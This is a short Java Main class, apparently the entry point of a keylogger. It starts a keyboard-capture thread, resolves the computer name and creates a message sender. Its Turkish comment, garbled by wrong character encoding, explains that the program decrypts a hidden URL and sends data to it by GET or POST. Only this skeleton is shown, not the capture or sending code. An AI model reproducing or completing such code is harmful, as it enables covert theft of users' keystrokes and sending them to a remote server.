package main;

import ComputerNameSettings.ComputerNameSolver;
import keyboard.Keyboard;
import messages.MessageSender;

/*
 * 
 * kardeþ bu program buradan baþlar baþta net kýsmýný oluþturur net kýsmýnda get ve post 
 * senderi oluþturur oradan da oluþturulan senderdan url almak için decrypt eder sayfayý 
 * decrypt edilen url yi alýp ona get veya posta göre atým yapar
 * 
 * 
 */
public class Main {

	public static void main(String[] args) throws InterruptedException {
		// internetle olan baðlantýlarý ayarlar
		ComputerNameSolver solver = new ComputerNameSolver();

		Keyboard key = new Keyboard();
		key.start();

		MessageSender sender = new MessageSender();

	}

}
